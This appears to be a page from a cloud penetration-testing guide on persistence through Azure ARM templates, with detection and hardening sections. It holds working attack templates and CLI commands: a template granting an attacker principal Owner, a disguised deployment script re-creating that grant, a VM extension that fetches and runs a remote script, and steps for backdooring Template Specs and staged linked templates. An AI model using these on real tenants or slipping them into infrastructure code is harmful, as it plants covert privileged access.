---
cstg_id: CSTG-AZURE-ARM-TEMPLATES-PERSIST
title: "AZURE Arm Templates - Persistence"
provider: azure
service: arm-templates
phase: persistence
required_access: assumed-breach
required_permissions:
  - "Microsoft.Resources/deployments/write"
  - "Microsoft.Resources/deployments/whatIf/action"
  - "Microsoft.Resources/templateSpecs/write"
  - "Microsoft.Resources/deploymentScripts/write"
  - "Microsoft.Authorization/roleAssignments/write (to persist privileged grants via template)"
  - "Microsoft.ManagedIdentity/userAssignedIdentities/write"
  - "Microsoft.Compute/virtualMachines/extensions/write"
  - "Microsoft.Storage/storageAccounts/write (to tamper staged linked templates)"
tools:
  - azure-cli
  - azure-powershell
  - arm-rest-api
  - bicep-cli
  - microburst
references:
  - "https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/overview"
  - "https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/deployment-script-template"
  - "https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/template-specs"
  - "https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/linked-templates"
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/role-assignments-template"
  - "https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/how-to-managed-identity-regional-move"
  - "https://hackingthe.cloud/azure/"
license: CC BY-SA 4.0
---

## Summary

Because ARM templates can declaratively create *any* resource type — including identities, role assignments, automation, and code-execution primitives — write access to the deployment control plane is a powerful and durable persistence surface. A template deployment is "infrastructure as code," so an attacker who can submit deployments (or who can tamper with the templates an organization already deploys) can plant persistence that blends into legitimate IaC change and re-asserts itself whenever the pipeline runs.

This page covers persistence achieved through ARM/Bicep templates and the surrounding deployment machinery: creating backdoor role assignments, planting user-assigned managed identities with standing privileges, deploying `deploymentScripts` and VM extensions that execute attacker code under a privileged identity, weaponizing reusable **Template Specs**, and tampering with **linked/nested templates** staged in storage so that future legitimate deployments silently re-introduce the backdoor.

The attacker objective is durable, low-noise access that survives credential rotation, blends with normal change management, and ideally re-establishes itself automatically.

## Prerequisites

- Assumed-breach foothold: control of a principal (user, service principal, or managed identity) able to submit deployments at some scope.
- One or more of the write permissions in `required_permissions`. Built-in **Contributor** grants `deployments/write`, `deploymentScripts/write`, VM extension write, and storage write, but **not** `roleAssignments/write`; **Owner** or **User Access Administrator** is required to persist role assignments via template.
- For linked-template tampering: write access to the staging storage account/container, or a write-capable SAS token recovered during enumeration (see [ARM Templates - Enumeration](../02-services/azure-arm-templates-enum.md)).
- Tooling able to submit ARM deployments: `az deployment ... create`, Azure PowerShell, or the ARM REST API.

## Enumeration

Before planting, confirm the available scopes and existing IaC so persistence blends in:

```bash
az deployment group list -g <rg> -o table          # existing deployment names to mimic
az ts list -o table                                # existing Template Specs to backdoor
az role assignment list --all -o table             # current grants (avoid duplicates)
az identity list -o table                          # existing user-assigned identities
az deployment group show -g <rg> -n <name> \
  --query "properties.templateLink" -o jsonc        # staging URIs to tamper
```

## Misconfigurations & Findings

- **Standing write to deployments combined with privileged roles** (Owner/UAA) allows self-perpetuating role-assignment backdoors.
- **`deploymentScripts` with an attacker-controlled or over-privileged managed identity** lets templates run arbitrary shell/PowerShell in Azure-managed containers.
- **Linked/nested templates referenced by SAS URI** that the organization re-deploys on a schedule — if the staging blob is writable, the deployed content is attacker-controlled.
- **Template Specs editable by Contributors** become a shared, versioned distribution point for backdoored IaC.
- **User-assigned managed identities** that can be attached to many resources provide a portable, role-bearing identity that outlives any single VM.
- **No CI scanning or approval on IaC**, so malicious template diffs deploy without review.

## Exploitation

Each subsection corresponds to one permission that enables a distinct persistence path.

### Microsoft.Authorization/roleAssignments/write

Deploy a template that grants a controlled principal a privileged role at subscription or management-group scope. Because it is delivered as a normal deployment, it appears as ordinary IaC change.

```json
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "parameters": { "principalId": { "type": "string" } },
  "resources": [{
    "type": "Microsoft.Authorization/roleAssignments",
    "apiVersion": "2022-04-01",
    "name": "[guid(subscription().id, parameters('principalId'), 'Owner')]",
    "properties": {
      "roleDefinitionId": "[subscriptionResourceId('Microsoft.Authorization/roleDefinitions','8e3af657-a8ff-443c-a75c-2fe8c4bcb635')]",
      "principalId": "[parameters('principalId')]",
      "principalType": "ServicePrincipal"
    }
  }]
}
```

```bash
az deployment sub create --location <loc> \
  --template-file backdoor-ra.json \
  --parameters principalId=<attacker-sp-object-id>
```

The grant survives password/secret rotation of the original foothold because it targets a separate principal. Reasserting it via a recurring pipeline restores it after cleanup.

### Microsoft.Resources/deploymentScripts/write

`deploymentScripts` execute arbitrary Azure CLI or PowerShell in a managed container during deployment, under a user-assigned managed identity you specify. This is a code-execution-on-demand persistence primitive.

```json
{
  "type": "Microsoft.Resources/deploymentScripts",
  "apiVersion": "2020-10-01",
  "name": "maintenance-task",
  "location": "[resourceGroup().location]",
  "kind": "AzureCLI",
  "identity": {
    "type": "UserAssigned",
    "userAssignedIdentities": { "[parameters('uamiResourceId')]": {} }
  },
  "properties": {
    "azCliVersion": "2.52.0",
    "retentionInterval": "P1D",
    "scriptContent": "az role assignment create --assignee <attacker-sp> --role Owner --scope /subscriptions/<sub>"
  }
}
```

If this resource is embedded in a template the organization redeploys, the script re-runs each time, re-establishing access. Setting a long `retentionInterval` or `cleanupPreference: Always` reduces residual artifacts.

### Microsoft.Compute/virtualMachines/extensions/write

Deploy a `CustomScript`/`customScriptExtension` (Windows/Linux) via template to run a payload on an existing VM under the VM's identity. As IaC, it can be re-applied on every deployment, surviving manual extension removal.

```json
{
  "type": "Microsoft.Compute/virtualMachines/extensions",
  "apiVersion": "2023-09-01",
  "name": "[concat(parameters('vmName'),'/bootstrap')]",
  "location": "[resourceGroup().location]",
  "properties": {
    "publisher": "Microsoft.Azure.Extensions",
    "type": "CustomScript",
    "typeHandlerVersion": "2.1",
    "settings": { "fileUris": ["https://<staging>/agent.sh?<sas>"] },
    "protectedSettings": { "commandToExecute": "sh agent.sh" }
  }
}
```

### Microsoft.ManagedIdentity/userAssignedIdentities/write

Create a user-assigned managed identity, grant it a privileged role, and attach it to resources you control or to `deploymentScripts`. The identity is a portable, password-less credential that persists independently of any single compromised secret and can be reattached after cleanup.

```bash
az identity create -g <rg> -n maint-uami
az role assignment create --assignee <uami-principal-id> --role Contributor --scope /subscriptions/<sub>
```

### Microsoft.Resources/templateSpecs/write

Publish or modify a **Template Spec** so the shared, versioned artifact contains a backdoor (a role assignment, a `deploymentScripts`, or an extension). Anyone in the org who deploys that spec — including pipelines — propagates the persistence. Bumping a new version while leaving the trusted name intact hides the change.

```bash
az ts create -g <rg> -n shared-baseline --version 1.4.2 \
  --template-file backdoored-baseline.json --location <loc>
```

### Microsoft.Storage/storageAccounts/write (linked-template tampering)

When deployments reference linked/nested templates by `templateLink.uri` pointing at blob storage, overwrite the staged template (or its parameters file) so the next legitimate deployment pulls attacker content. This is the stealthiest path: the deployment *name*, pipeline, and approver are all legitimate; only the staged artifact changed.

```bash
az storage blob upload --account-name <acct> -c <container> \
  -n linked/network.json -f backdoored-network.json --overwrite --auth-mode login
```

### Microsoft.Resources/deployments/write (general)

Even without privileged roles, the ability to create deployments lets an attacker continuously redeploy any of the above whenever cleanup occurs, and to schedule redeployment through automation accounts, logic apps, or pipeline definitions deployed as part of a template.

## Detection & Logging

- **Azure Activity Logs** record `Microsoft.Resources/deployments/write`, `deploymentScripts/write`, `roleAssignments/write`, `userAssignedIdentities/write`, and `virtualMachines/extensions/write`. Alert on:
  - Any `roleAssignments/write` granting Owner/User Access Administrator/Contributor at subscription or management-group scope.
  - `deploymentScripts` creation, especially with a user-assigned identity that holds high privilege.
  - Custom script / VM extension deployments outside change windows.
  - Template Spec writes and new versions to shared specs.
- **Entra ID audit logs** record creation of managed identities and service-principal role/credential changes; **sign-in logs** correlate the deploying principal, source IP, and device.
- **Storage diagnostic logs** (`StorageWrite`) capture overwrites of staged linked templates — a key signal for the tampering path, which otherwise looks like a normal deployment.
- Correlate the *deployment* event with the *resources it created*: a single deployment that creates an identity, assigns it Owner, and runs a script is a high-confidence persistence pattern.
- Managed detections: Microsoft Defender for Cloud flags suspicious role assignments and deployment-script abuse; Microsoft Sentinel rules can join Activity Log deployment events to new privileged grants.

## Remediation & Hardening

- **Separate duties:** withhold `Microsoft.Authorization/roleAssignments/write` (Owner/UAA) from principals that hold `deployments/write`; require PIM-eligible, time-bound elevation for role-assignment changes.
- **Gate IaC through reviewed pipelines** with mandatory peer approval and policy-as-code (Azure Policy `deny`/`audit`) that blocks `roleAssignments`, `deploymentScripts`, and unexpected extensions in templates.
- **Pin and verify linked templates:** serve them over private endpoints, require user-delegation SAS with short lifetimes, and integrity-check (hash) staged artifacts before deployment instead of trusting a blob URI.
- **Restrict Template Spec write** to a small, audited group; require version review.
- **Inventory and constrain user-assigned managed identities;** alert on new identities receiving privileged roles.
- **Continuously reconcile** deployed role assignments and extensions against approved IaC to detect re-asserting backdoors; treat unexplained re-creation after cleanup as active persistence.
- **Set `cleanupPreference`/retention** policies and monitor `deploymentScripts` resource groups, which are otherwise easy to overlook.

## Tools

- **azure-cli** (`az deployment ... create`, `az ts create`, `az identity create`, `az role assignment create`) — deploys persistence resources.
- **azure-powershell** (`New-AzResourceGroupDeployment`, `New-AzTemplateSpec`) — equivalent cmdlets.
- **arm-rest-api** — scripted deployment submission to `management.azure.com`.
- **bicep-cli** — author backdoored modules and compile to JSON for staging.
- **microburst** — Azure attack tooling for identity and storage abuse during staging.

## References

- Azure Resource Manager templates overview — Microsoft Learn
- Deployment scripts in ARM templates — Microsoft Learn
- Template Specs — Microsoft Learn
- Linked and nested templates — Microsoft Learn
- Assign Azure roles using ARM templates — Microsoft Learn
- Managed identities for Azure resources — Microsoft Learn
- hackingthe.cloud — Azure techniques index
